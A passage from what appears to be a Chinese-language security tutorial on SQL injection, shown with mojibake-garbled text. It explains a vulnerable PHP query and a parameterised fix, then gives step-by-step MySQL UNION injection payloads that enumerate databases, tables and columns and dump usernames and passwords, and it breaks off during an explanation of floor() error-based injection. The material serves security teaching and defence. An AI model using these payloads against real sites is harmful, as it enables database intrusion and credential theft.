class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from members where userid=&quot;</span>.<span class="variable">$_GET</span>[userid];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„é€»è¾‘æ˜¯æ ¹æ®ç”¨æˆ·è¯·æ±‚çš„Useridè¿›å…¥æ•°æ®åº“æŸ¥è¯¢å‡ºä¸åŒçš„ç”¨æˆ·å¹¶ä¸”è¿”å›ç»™ç”¨æˆ·ï¼Œå¯ä»¥çœ‹åˆ°æœ€ç»ˆä¼ å…¥çš„å­—ç¬¦ä¸²æœ‰ä¸€éƒ¨åˆ†æ˜¯æ ¹æ®ç”¨æˆ·çš„è¾“å…¥æ¥æ§åˆ¶çš„ï¼Œä¸€æ—¦ç”¨æˆ·æäº¤<code>poc.php?userid=1 or 1=1</code>æœ€ç»ˆè¿›å…¥ç¨‹åºä¹‹åä¼ å…¥æ•°æ®åº“çš„é€»è¾‘å°†æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from members where userid=1 or 1=1&quot;</span>);</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·å®Œå…¨å¯ä»¥æ ¹æ®ä¼ å…¥çš„å†…å®¹æ¥æ§åˆ¶æ•´ä¸ªSQLçš„é€»è¾‘ï¼Œå®ç°é—´æ¥æ§åˆ¶å’Œç®¡ç†æ•°æ®åº“çš„ç›®çš„ï¼Œ<code>è¿™ç§å‘½ä»¤ï¼ˆSQLè¯­å¥ï¼‰å’Œæ•°æ®ï¼ˆç”¨æˆ·æäº¤çš„æŸ¥è¯¢ï¼‰ä¸åˆ†å¼€çš„å®ç°æ–¹å¼å¯¼è‡´äº†å®‰å…¨æ¼æ´çš„äº§ç”Ÿã€‚</code> ç”±äºä¸åŒçš„å¼€å‘è¯­è¨€å¯èƒ½å¯¹apiè¿›è¡Œäº†ä¸åŒçš„å°è£…ï¼Œå¹¶ä¸”å„ç§è¯­è¨€å†…éƒ¨å¯¹æ•°æ®çš„æ ¡éªŒä¼šæœ‰ä¸åŒçš„è¦æ±‚ï¼Œè­¬å¦‚javaå’Œpythonå±äºå˜é‡å¼ºç±»å‹å¹¶ä¸”å„ç§å¼€å‘æ¡†æ¶çš„æµè¡Œå¯¼è‡´å‡ºç°SQLæ³¨å°„çš„å‡ ç‡è¾ƒå°ï¼Œphpå±äºå¼±ç±»å‹ä¸ä¼šå¯¹æ•°æ®è¿›è¡Œå¼ºåˆ¶çš„éªŒè¯åŠ ä¸Šè¿‡ç¨‹åŒ–çš„ç¨‹åºç¼–å†™æ€è·¯å¯¼è‡´å‡ºç°æ³¨å°„çš„å‡ ç‡ä¼šè¾ƒå¤§ã€‚</p><h2 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h2><p>é€šè¿‡å…¸å‹çš„SQLæ³¨å°„æ¼æ´ï¼Œé»‘å®¢æ˜¯å¯ä»¥æ ¹æ®æ‰€èƒ½æ§åˆ¶çš„å†…å®¹åœ¨SQLè¯­å¥çš„ä¸Šä¸‹æ–‡å¯¼è‡´ä¸åŒçš„ç»“æœçš„ï¼Œè¿™ç§ä¸åŒä¸»è¦ä½“ç°åœ¨ä¸åŒçš„<code>æ•°æ®åº“ç‰¹æ€§ä¸Šå’Œç»†èŠ‚ä¸Š</code>ã€‚åŒæ—¶ï¼Œåç«¯çš„æ•°æ®åº“çš„ä¸åŒå¯¼è‡´é»‘å®¢èƒ½åˆ©ç”¨SQLè¯­å¥è¿›è¡Œçš„æ“ä½œä¹Ÿå¹¶ä¸ç›¸åŒï¼Œå› ä¸ºå¾ˆå¤šçš„æ•°æ®åº“åœ¨æ ‡å‡†çš„SQLä¹‹å¤–ä¹Ÿä¼šå®ç°ä¸€äº›è‡ªèº«æ¯”è¾ƒç‰¹åˆ«çš„åŠŸèƒ½å’Œæ‰©å±•ï¼Œ<code>å¸¸è§çš„æœ‰Sqlserverçš„å¤šè¯­å¥æŸ¥è¯¢ï¼ŒMysqlçš„é«˜æƒé™å¯ä»¥è¯»å†™ç³»ç»Ÿæ–‡ä»¶ï¼ŒOracleç»å¸¸å‡ºç°çš„ä¸€äº›ç³»ç»ŸåŒ…ææƒæ¼æ´ã€‚</code> å³ä½¿ä¸€äº›SQLæ³¨å°„æœ¬èº«æ— æ³•å¯¹æ•°æ®æœ¬èº«è¿›è¡Œä¸€äº›é«˜çº§åˆ«çš„å±å®³ï¼Œè­¬å¦‚ä¸€äº›æ•°æ®åº“é‡Œå¯èƒ½æ²¡æœ‰å­˜å‚¨ç§å¯†ä¿¡æ¯ï¼Œåˆ©ç”¨SQLæŸ¥è¯¢çš„ç»“æœä¸€æ ·å¯èƒ½å¯¹åº”ç”¨é€ æˆå·¨å¤§çš„ç¾éš¾ï¼Œå› ä¸ºåº”ç”¨å¯èƒ½å°†ä»æ•°æ®åº“é‡Œæå–çš„ä¿¡æ¯åšä¸€äº›å…¶ä»–çš„æ¯”è¾ƒé«˜å±é™©çš„åŠ¨ä½œï¼Œè­¬å¦‚è¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œè¿™ç§æœ¬èº«æ— ä»·å€¼çš„æ•°æ®å’ŒæŸ¥è¯¢ä¸€æ—¦è¢«åº”ç”¨æœ¬èº«èµ‹äºˆè¾ƒé«˜çš„æ„ä¹‰çš„è¯ï¼Œå¯èƒ½ä¸€æ ·å¯¼è‡´å¾ˆé«˜çš„å±å®³ã€‚ è¯„ä¼°ä¸€ä¸ªSQLæ³¨å°„çš„å±å®³éœ€è¦å–å†³äºæ³¨å°„ç‚¹å‘ç”Ÿçš„SQLè¯­å¥çš„ä¸Šä¸‹æ–‡ï¼ŒSQLè¯­å¥åœ¨åº”ç”¨çš„ä¸Šä¸‹æ–‡ï¼Œåº”ç”¨åœ¨æ•°æ®åº“çš„ä¸Šä¸‹æ–‡ï¼Œç»¼åˆè€ƒè™‘è¿™äº›å› ç´ æ¥è¯„ä¼°ä¸€ä¸ªSQLæ³¨å°„çš„å½±å“ï¼Œåœ¨æ— ä¸Šè¿°åˆ©ç”¨ç»“æœçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡webåº”ç”¨å‘æ•°æ®åº“ä¼ é€’ä¸€äº›èµ„æºè¦æ±‚æé«˜çš„æŸ¥è¯¢å°†å¯¼è‡´æ•°æ®åº“çš„æ‹’ç»æœåŠ¡ï¼Œè¿™å°†æ˜¯é»‘å®¢å¯èƒ½èƒ½è¿›è¡Œçš„æœ€åçš„åˆ©ç”¨ã€‚</p><h2 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h2><p>æ¯”è¾ƒä¼ ç»Ÿçš„ä¿®å¤æ–¹å¼ä¸€èˆ¬è®¤ä¸ºæ˜¯å¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ï¼Œä½†æ˜¯ç”±äºè¾“å…¥çš„æ¥æºå¤ªè¿‡å¹¿æ³›ï¼Œå¯èƒ½æ¥è‡ªäºæ•°æ®åº“ï¼ŒHTTPè¯·æ±‚ï¼Œæ–‡ä»¶æˆ–è€…å…¶ä»–çš„æ•°æ®æ¥æºï¼Œè¾ƒéš¾å¯¹æ‰€æœ‰è¿›å…¥çš„æ•°æ®åœ¨å„ç§åœºæ™¯ä¸‹è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤ã€‚ äº‹å®ä¸Šæœ€ç½ªæ¶çš„ä¸æ˜¯æ•°æ®ï¼Œè€Œæ˜¯æˆ‘ä»¬ä½¿ç”¨æ•°æ®çš„æ–¹å¼ï¼Œæœ€ä¸ºå½»åº•çš„ä¿®å¤ä¸€å®šè¦æŸ¥æ‰¾æœ€ä¸ºå½»åº•çš„æ ¹æºï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ€åçš„æ ¹æºåœ¨äºå¯¹æ•°æ®å’ŒæŒ‡ä»¤çš„ä¸åˆ†ç¦»ï¼Œæ‰€ä»¥åœ¨ä¿®å¤çš„æ—¶å€™åº”è¯¥æåŠ›å°†æ•°æ®å’ŒæŒ‡ä»¤åˆ†ç¦»ã€‚ç›®å‰è¾ƒä¸ºæå€¡çš„ï¼ŒåŒæ—¶åœ¨å„ç§æ•°æ®åº“æ“ä½œæ¡†æ¶é‡Œä½“ç°çš„æ–¹å¼å°±æ˜¯ä»¥å¡«å……æ¨¡æ¿çš„æ–¹å¼æ¥ä»£æ›¿ä¼ ç»Ÿçš„æ‹¼æ¥çš„æ–¹å¼è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œè­¬å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SqlTemplate</span>=<span class="string">&quot;select * from members where userid=&#123;userid|int&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">PreSql</span>(<span class="variable">$SqlTemplate</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>æ¨¡æ¿é‡Œæœ‰å…³æ•°æ®åŠæ•°æ®è‡ªèº«æ„ä¹‰çš„æè¿°ï¼ŒPreSqlæ–¹æ³•å°†å®ç°å°†æ¨¡æ¿å’Œæ•°æ®å®‰å…¨çš„è½¬æ¢ä¸ºSQLè¯­å¥çš„åŠŸèƒ½ï¼Œä»¥ä¿éšœæœ€ç»ˆçš„å®‰å…¨çš„å®ç°</p><h1 id="å§¿åŠ¿æ€»ç»“"><a href="#å§¿åŠ¿æ€»ç»“" class="headerlink" title="å§¿åŠ¿æ€»ç»“"></a>å§¿åŠ¿æ€»ç»“</h1><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><p>æˆ‘ä»¬ç¯¡æ”¹SQLè¯­å¥å¾ˆå¤šæ—¶å€™éƒ½ä¼šä½¿ç”¨åˆ°æ³¨é‡Šï¼ŒSQLè¯­æ³•ä¸­çš„æ³¨é‡Šç¬¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">--+(è¿™é‡Œçš„+å…¶å®æ˜¯ç©ºæ ¼çš„æ„æ€ï¼Œå› ä¸ºæˆ‘ä»¬çš„æ³¨å…¥æ—¶+é€šå¸¸ä¼šè¢«è¯†åˆ«ä¸ºç©ºæ ¼ï¼Œè¿™æ˜¯æ—©æœŸå…»æˆçš„ä¹ æƒ¯ï¼Œä½†æ˜¯åæ¥åœ¨çœ‹ä¸€äº›å¤§ç‰›çš„æ–‡ç« çš„æ—¶å€™ä¼šå‘ç°ä»–ä»¬æ›´çˆ±ç”¨-- -è¿™ç§å½¢å¼ï¼Œå¾ˆå¤šå·¥å…·ç­‰ç­‰ä¹Ÿæ˜¯)</span><br><span class="line"><span class="regexp">/**/</span>(è¿™ä¸ªä¹Ÿä¸å¤ªå¸¸ç”¨)</span><br></pre></td></tr></table></figure><h2 id="åŒ…å«ä¿¡æ¯çš„å†…ç½®è¡¨"><a href="#åŒ…å«ä¿¡æ¯çš„å†…ç½®è¡¨" class="headerlink" title="åŒ…å«ä¿¡æ¯çš„å†…ç½®è¡¨"></a>åŒ…å«ä¿¡æ¯çš„å†…ç½®è¡¨</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">information_schema.<span class="keyword">tables</span></span><br><span class="line">information_schema.<span class="keyword">columns</span></span><br></pre></td></tr></table></figure><h1 id="mysqlæ³¨å…¥"><a href="#mysqlæ³¨å…¥" class="headerlink" title="mysqlæ³¨å…¥"></a>mysqlæ³¨å…¥</h1><h2 id="mysqlæ•°æ®åº“"><a href="#mysqlæ•°æ®åº“" class="headerlink" title="mysqlæ•°æ®åº“"></a>mysqlæ•°æ®åº“</h2><p>MySQLæ˜¯ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œç”±ç‘å…¸ MySQL AB å…¬å¸å¼€å‘ï¼Œç›®å‰å±äº Oracle å…¬å¸ã€‚MySQL æ˜¯ä¸€ç§ <code>å…³è”æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ</code> ï¼Œå…³è”æ•°æ®åº“å°†æ•°æ®ä¿å­˜åœ¨ä¸åŒçš„è¡¨ä¸­ï¼Œè€Œä¸æ˜¯å°†æ‰€æœ‰æ•°æ®æ”¾åœ¨ä¸€ä¸ªå¤§ä»“åº“å†…ï¼Œè¿™æ ·å°±å¢åŠ äº†é€Ÿåº¦å¹¶æé«˜äº†çµæ´»æ€§ã€‚</p><ul><li>MySQLæ˜¯å¼€æºçš„ï¼Œæ‰€ä»¥ä½ ä¸éœ€è¦æ”¯ä»˜é¢å¤–çš„è´¹ç”¨ã€‚</li><li>MySQLä½¿ç”¨æ ‡å‡†çš„ SQL æ•°æ®è¯­è¨€å½¢å¼ã€‚</li><li>MySQLå¯ä»¥è¿è¡Œäºå¤šä¸ªç³»ç»Ÿä¸Šï¼Œå¹¶ä¸” æ”¯æŒå¤šç§è¯­è¨€ ã€‚è¿™äº›ç¼–ç¨‹è¯­è¨€åŒ…æ‹¬ Cã€C++ã€Pythonã€Javaã€Perlã€PHPã€Eiffelã€Ruby å’Œ Tcl ç­‰ã€‚</li><li>MySQL å¯¹PHPæœ‰å¾ˆå¥½çš„æ”¯æŒ ï¼ŒPHP æ˜¯ç›®å‰æœ€æµè¡Œçš„ Web å¼€å‘è¯­è¨€ã€‚</li><li>MySQL æ”¯æŒå¤§å‹æ•°æ®åº“ ï¼Œæ”¯æŒ 5000 ä¸‡æ¡è®°å½•çš„æ•°æ®ä»“åº“ï¼Œ32 ä½ç³»ç»Ÿè¡¨æ–‡ä»¶æœ€å¤§å¯æ”¯æŒ 4GBï¼Œ64 ä½ç³»ç»Ÿæ”¯æŒæœ€å¤§çš„è¡¨æ–‡ä»¶ä¸º8TBã€‚</li><li>MySQLæ˜¯ å¯ä»¥å®šåˆ¶çš„ ï¼Œé‡‡ç”¨äº† GPL åè®®ï¼Œä½ å¯ä»¥ä¿®æ”¹æºç æ¥å¼€å‘è‡ªå·±çš„ MySQL ç³»ç»Ÿã€‚</li></ul><p>ä¸€ä¸ªå®Œæ•´çš„mysqlç®¡ç†ç³»ç»Ÿç»“æ„é€šå¸¸å¦‚ä¸‹å›¾ï¼š<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241358298.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œmysqlå¯ä»¥ç®¡ç† <code>å¤šä¸ªæ•°æ®åº“</code> ï¼Œä¸€ä¸ªæ•°æ®åº“å¯ä»¥åŒ…å« <code>å¤šä¸ªæ•°æ®è¡¨</code>ï¼Œè€Œä¸€ä¸ªæ•°æ®è¡¨æœ‰å«æœ‰ <code>å¤šæ¡å­—æ®µ</code> ï¼Œä¸€è¡Œæ•°æ®æ­£æ˜¯å¤šä¸ªå­—æ®µåŒä¸€è¡Œçš„ä¸€ä¸²æ•°æ®ã€‚</p><p>Mysqlå…·æœ‰å¾ˆç‹¬ç‰¹çš„ç‰¹ç‚¹è€Œä¸”ä½¿ç”¨æœ€ä¸ºå¹¿æ³›ï¼ŒMysqlæ•°æ®åº“æœ¬èº«çš„æƒé™æé«˜ï¼Œä½œä¸ºåº”ç”¨å¯ä»¥å¯¹æœ¬æœºè¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œå¯ä»¥è¿›è¡Œææƒç­‰ã€‚</p><h2 id="è”åˆæŸ¥è¯¢"><a href="#è”åˆæŸ¥è¯¢" class="headerlink" title="è”åˆæŸ¥è¯¢"></a>è”åˆæŸ¥è¯¢</h2><p>å¾ˆå¤šæ—¶å€™è”åˆæŸ¥è¯¢ä¹Ÿä¼šå’Œå…¶ä»–çš„å‡ ç§æŸ¥è¯¢æ–¹å¼ä¸€èµ·ä½¿ç”¨ã€‚<br>è”åˆæŸ¥è¯¢ç”¨åˆ°çš„SQLè¯­æ³•çŸ¥è¯†</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">UNION</span>å¯ä»¥å°†å‰åä¸¤ä¸ªæŸ¥è¯¢è¯­å¥çš„ç»“æœæ‹¼æ¥åˆ°ä¸€èµ·ï¼Œä½†æ˜¯ä¼šè‡ªåŠ¨å»é‡ã€‚</span><br><span class="line"><span class="built_in">UNION</span> <span class="built_in">ALL</span>åŠŸèƒ½ç›¸åŒï¼Œä½†æ˜¯ä¼šæ˜¾ç¤ºæ‰€æœ‰æ•°æ®ï¼Œä¸ä¼šå»é‡ã€‚</span><br></pre></td></tr></table></figure><p>å…·æœ‰ç±»ä¼¼åŠŸèƒ½çš„è¿˜æœ‰JOIN <a href="https://blog.csdn.net/julielele/article/details/82023577">https://blog.csdn.net/julielele/article/details/82023577</a> ä½†æ˜¯æ˜¯ä¸€ä¸ªå¯¹åº“è¡¨ç­‰è¿›è¡Œè¿æ¥çš„è¯­å¥ï¼Œæˆ‘ä»¬åœ¨åç»­çš„ç»•è¿‡ä¸­ä¼šæåˆ°åˆ©ç”¨å®ƒæ¥è¿›è¡Œæ— åˆ—åæ³¨å…¥ã€‚</p><ol><li><p>åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œæ³¨å…¥æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹ï¼Œé—­åˆæƒ…å†µï¼Œç»•è¿‡æ–¹å¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; </span></span><br><span class="line"><span class="string">?id=1&quot; </span></span><br><span class="line"><span class="string">?id=1&#x27;</span>) </span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot;) </span></span><br><span class="line"><span class="string">?id=1&#x27; or 1#</span></span><br><span class="line"><span class="string">?id=1&#x27; or 0#</span></span><br><span class="line"><span class="string">?id=1&#x27; or 1=1#</span></span><br><span class="line"><span class="string">?id=1&#x27; and 1=2#</span></span><br><span class="line"><span class="string">?id=1&#x27; and sleep(5)#</span></span><br><span class="line"><span class="string">?id=1&#x27; and 1=2 or &#x27; </span></span><br><span class="line"><span class="string">?id=1\</span></span><br></pre></td></tr></table></figure></li><li><p>çŒœæµ‹SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°</p></li></ol><ul><li>ä½¿ç”¨ order&#x2F;group by è¯­å¥ï¼Œé€šè¿‡å¾€åè¾¹æ‹¼æ¥æ•°å­—æŒ‡å¯¼é¡µé¢æŠ¥é”™ï¼Œå¯ç¡®å®šå­—æ®µæ•°é‡ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 1#</span></span><br><span class="line"><span class="string">1&#x27;</span> order by 2<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; order by 3#</span></span><br><span class="line"><span class="string">1 order by 1</span></span><br><span class="line"><span class="string">1 order by 2</span></span><br><span class="line"><span class="string">1 order by 3</span></span><br><span class="line"><span class="string">```   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- ä½¿ç”¨ union select è”åˆæŸ¥è¯¢ï¼Œä¸æ–­åœ¨ union select åé¢åŠ æ•°å­—ï¼Œç›´åˆ°ä¸æŠ¥é”™ï¼Œå³å¯ç¡®å®šå­—æ®µæ•°é‡ã€‚</span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; union select 1,2#</span></span><br><span class="line"><span class="string">1&#x27;</span> union select 1,2,3<span class="comment">#</span></span><br><span class="line">1 union select 1<span class="comment">#</span></span><br><span class="line">1 union select 1,2<span class="comment">#</span></span><br><span class="line">1 union select 1,2,3<span class="comment">#</span></span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li>ç¡®å®šæ˜¾ç¤ºæ•°æ®çš„å­—æ®µä½ç½®<br>ä½¿ç”¨ union select 1,2,3,4,â€¦ æ ¹æ®å›æ˜¾çš„å­—æ®µæ•°ï¼Œåˆ¤æ–­å›æ˜¾æ•°æ®çš„å­—æ®µä½ç½®ã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1#</span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,2<span class="comment">#</span></span><br><span class="line">-1<span class="string">&#x27; union select 1,2,3#</span></span><br><span class="line"><span class="string">-1 union select 1#</span></span><br><span class="line"><span class="string">-1 union select 1,2#</span></span><br><span class="line"><span class="string">-1 union select 1,2,3#</span></span><br></pre></td></tr></table></figure></li></ol><p>æ³¨æ„ï¼š</p><ul><li>è‹¥ç¡®å®šé¡µé¢æœ‰å›æ˜¾ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æˆ‘ä»¬å®šä¹‰çš„ç‰¹æ®Šæ ‡è®°æ•°å­—å‡ºç°ï¼Œå¯èƒ½æ˜¯é¡µé¢è¿›è¡Œçš„æ˜¯å•è¡Œæ•°æ®è¾“å‡ºï¼Œæˆ‘ä»¬è®©å‰è¾¹çš„ select æŸ¥è¯¢æ¡ä»¶è¿”å›ç»“æœä¸ºç©ºå³å¯ã€‚</li><li>â¼€å®šè¦æ‹¼æ¥å¤Ÿè¶³å¤Ÿçš„å­—æ®µæ•°ï¼Œå¦åˆ™SQLè¯­å¥æŠ¥é”™ã€‚</li></ul><ol start="4"><li>åœ¨å›æ˜¾æ•°æ®çš„å­—æ®µä½ç½®ä½¿ç”¨ union select å°†æˆ‘ä»¬æ‰€éœ€è¦çš„æ•°æ®æŸ¥è¯¢å‡ºæ¥å³å¯ã€‚åŒ…æ‹¬ä½†ä¸é™äºï¼š</li></ol><ul><li><p>è·å–å½“å‰æ•°æ®åº“å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure></li><li><p>è·å–å½“å‰æ•°æ®åº“çš„è¡¨å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,(select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()),3--+</span><br></pre></td></tr></table></figure></li><li><p>è·å–è¡¨ä¸­çš„å­—æ®µå</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;users&#x27;</span>),3--+</span><br></pre></td></tr></table></figure></li><li><p>è·å–æ•°æ®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1<span class="string">&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-1&#x27;</span> union select 1,(select group_concat(<span class="built_in">id</span>,0x7c,username,0x7c,password) from <span class="built_in">users</span>),3--+</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬æƒ…å†µä¸‹å°±æ˜¯è¿™æ ·çš„ä¸€ä¸ªé¡ºåºï¼Œ<code>ç¡®å®šè”åˆæŸ¥è¯¢çš„å­—æ®µæ•°-&gt;ç¡®å®šè”åˆæŸ¥è¯¢å›æ˜¾ä½ç½®-&gt;çˆ†åº“-&gt;çˆ†è¡¨-&gt;çˆ†å­—æ®µ-&gt;çˆ†æ•°æ®ã€‚</code></p></li></ul><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨äº†group_concatæ¥æ‹¼æ¥æŸ¥è¯¢å¤šä¸ªæ•°æ®ï¼Œåœ¨å¾ˆå¤šç§æŸ¥è¯¢ä¸­éƒ½æœ‰ä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥æé«˜æ•ˆç‡ï¼ŒåŒæ—¶è¿˜å¯ä»¥æ‹¼æ¥åå…­è¿›åˆ¶ç‰¹æ®Šå­—ç¬¦æ¥åˆ†éš”ï¼ŒåŒæ—¶è¿˜ä½¿ç”¨äº†information_shcemaè¡¨è·å–è¡¨ä¿¡æ¯ã€å­—æ®µä¿¡æ¯ï¼Œè¿™ä¸ªè¡¨åœ¨ä½ç‰ˆæœ¬mysqlä¸­ä¸å­˜åœ¨ï¼ŒåŒæ—¶æœ‰æ—¶è¿˜ä¼šè¢«è¿‡æ»¤ï¼Œè¿™ä¹Ÿä¼šæ˜¯æˆ‘ä»¬ç»•è¿‡çš„ä¸€ä¸ªæ–¹å‘ã€‚</p><h2 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h2><p>å¤§ä½“çš„æ€è·¯å°±æ˜¯åˆ©ç”¨æŠ¥é”™å›æ˜¾ï¼ŒåŒæ—¶æˆ‘ä»¬çš„æŸ¥è¯¢æŒ‡ä»¤æˆ–è€…SQLå‡½æ•°ä¼šè¢«æ‰§è¡Œï¼Œ<code>æŠ¥é”™çš„è¿‡ç¨‹å¯èƒ½ä¼šå‡ºç°åœ¨æŸ¥è¯¢æˆ–è€…æ’å…¥ç”šè‡³åˆ é™¤çš„è¿‡ç¨‹ä¸­ã€‚</code></p><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>floor()ï¼ˆ8.x&gt;mysql&gt;5.0ï¼‰<code>åŒæŸ¥è¯¢æŠ¥é”™æ³¨å…¥</code><br>å‡½æ•°è¿”å›å°äºæˆ–ç­‰äºæŒ‡å®šå€¼ï¼ˆvalueï¼‰çš„æœ€å°æ•´æ•°,å–æ•´</p><p>é€šè¿‡flooræŠ¥é”™çš„æ–¹æ³•æ¥çˆ†æ•°æ®çš„æœ¬è´¨æ˜¯group byè¯­å¥çš„æŠ¥é”™ã€‚group byè¯­å¥æŠ¥é”™çš„åŸå› æ˜¯floor(random(0)*2)çš„ä¸ç¡®å®šæ€§ï¼Œå³å¯èƒ½ä¸º0ä¹Ÿå¯èƒ½ä¸º1<br>group by keyçš„åŸç†æ˜¯å¾ªç¯è¯»å–æ•°æ®çš„æ¯ä¸€è¡Œï¼Œå°†ç»“æœä¿å­˜äºä¸´æ—¶è¡¨ä¸­ã€‚è¯»å–æ¯ä¸€è¡Œçš„keyæ—¶ï¼Œå¦‚æœkeyå­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™ä¸åœ¨ä¸´æ—¶è¡¨ä¸­æ›´æ–°ä¸´æ—¶è¡¨ä¸­çš„æ•°æ®ï¼›å¦‚æœè¯¥keyä¸å­˜åœ¨äºä¸´æ—¶è¡¨ä¸­ï¼Œåˆ™åœ¨ä¸´æ—¶è¡¨ä¸­æ’å…¥keyæ‰€åœ¨è¡Œçš„æ•°æ®ã€‚<br>group by floor(random(0)*2)å‡ºé”™çš„åŸå› 